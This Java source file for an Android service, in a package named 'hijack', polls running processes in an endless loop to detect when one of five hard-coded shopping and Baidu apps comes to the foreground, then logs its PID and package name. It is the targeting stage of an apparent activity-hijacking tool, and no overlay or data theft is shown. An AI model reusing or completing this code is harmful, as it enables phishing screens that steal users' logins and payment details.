package com.haoren.hijack;
import java.util.Arrays;
import java.util.List;

import com.jaredrummler.android.processes.AndroidProcesses;
import com.jaredrummler.android.processes.models.AndroidAppProcess;
import com.jaredrummler.android.processes.models.Stat;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.util.Log;

public class GetProcService extends Service{
		private String[] TARGET_APPS = new String[]{"com.baidu.fb","com.jingdong.app.mall","com.meilishuo","com.dangdang.buy2","com.mogujie"};
		@Override
		public IBinder onBind(Intent intent) {
			return null;
		}

		@Override
		public int onStartCommand(Intent intent, int flags, int startId) {
			hiJack();
			
			return START_NOT_STICKY;
		}
		
		
		@Override
		public void onDestroy() {
			super.onDestroy();
		}

		public void hiJack(){
			Thread thread=new Thread(new Runnable()
	        {	
	            @Override
	            public void run()
	            {
	            	PackageManager pm = getApplicationContext().getPackageManager();
	            	AndroidAppProcess target = null;
	            	List<String> list = Arrays.asList(TARGET_APPS);
	            	String pName = null;
	            	while(true){
	            		target = null;
	            		List<AndroidAppProcess> processes = AndroidProcesses.getRunningAppProcesses();
	            		for(AndroidAppProcess a : processes){
	            			PackageInfo packageInfo;
							try {
								Stat stat = a.stat();
								int pid = stat.getPid();
								packageInfo = a.getPackageInfo(getApplicationContext(), 0);
								String appName = packageInfo.applicationInfo.loadLabel(pm).toString();
								pName = packageInfo.packageName;
								if(appName != null && list.contains(pName) && new AndroidAppProcess(pid).foreground){
									target = a;
									Log.i("xu", "xuxu"+pid);
									break;
								}
							} catch (Exception e) {
								e.printStackTrace();
							}
	            			
	            		}
	            		if(target != null){
	            			Log.i("xu", "xuxu"+pName);
	            			break;
	            		}
//	            		if (AndroidProcesses.isMyProcessInTheForeground()) {
//	            			Log.i("xu", "xuxu1");
//	            		}
	            	}
	            }
	        });
	        thread.start();
		}
}
//method to judge a app is a foreground one or not

//private static final boolean SYS_SUPPORTS_SCHEDGROUPS = new File("/dev/cpuctl/tasks").exists();
//if (SYS_SUPPORTS_SCHEDGROUPS)
//{
//  Cgroup cgroup = cgroup();
//  ControlGroup cpuacct = cgroup.getGroup("cpuacct");
//  ControlGroup cpu = cgroup.getGroup("cpu");
//  if (Build.VERSION.SDK_INT >= 21)
//  {
//    if ((cpu == null) || (cpuacct == null) || (!cpuacct.group.contains("pid_"))) {
//      throw new NotAndroidAppProcessException(pid);
//    }
//    boolean foreground = !cpu.group.contains("bg_non_interactive");
//    int uid;
//    try
//    {
//      uid = Integer.parseInt(cpuacct.group.split("/")[1].replace("uid_", ""));
//    }
//    catch (Exception e)
//    {
//      int uid;
//      uid = status().getUid();
//    }
//    AndroidProcesses.log("name=%s, pid=%d, uid=%d, foreground=%b, cpuacct=%s, cpu=%s", new Object[] { this.name, 
//      Integer.valueOf(pid), Integer.valueOf(uid), Boolean.valueOf(foreground), cpuacct.toString(), cpu.toString() });
//  }
//  else
//  {
//    if ((cpu == null) || (cpuacct == null) || (!cpu.group.contains("apps"))) {
//      throw new NotAndroidAppProcessException(pid);
//    }
//    boolean foreground = !cpu.group.contains("bg_non_interactive");
//    int uid;
//    try
//    {
//      uid = Integer.parseInt(cpuacct.group.substring(cpuacct.group.lastIndexOf("/") + 1));
//    }
//    catch (Exception e)
//    {
//      int uid;
//      uid = status().getUid();
//    }
//    AndroidProcesses.log("name=%s, pid=%d, uid=%d foreground=%b, cpuacct=%s, cpu=%s", new Object[] { this.name, 
//      Integer.valueOf(pid), Integer.valueOf(uid), Boolean.valueOf(foreground), cpuacct.toString(), cpu.toString() });
//  }
//}
//else
//{
//  if ((this.name.startsWith("/")) || (!new File("/data/data", getPackageName()).exists())) {
//    throw new NotAndroidAppProcessException(pid);
//  }
//  Stat stat = stat();
//  Status status = status();
//  
//  foreground = stat.policy() == 0;
//  uid = status.getUid();
//  AndroidProcesses.log("name=%s, pid=%d, uid=%d foreground=%b", new Object[] { this.name, Integer.valueOf(pid), Integer.valueOf(uid), Boolean.valueOf(foreground) });
//}
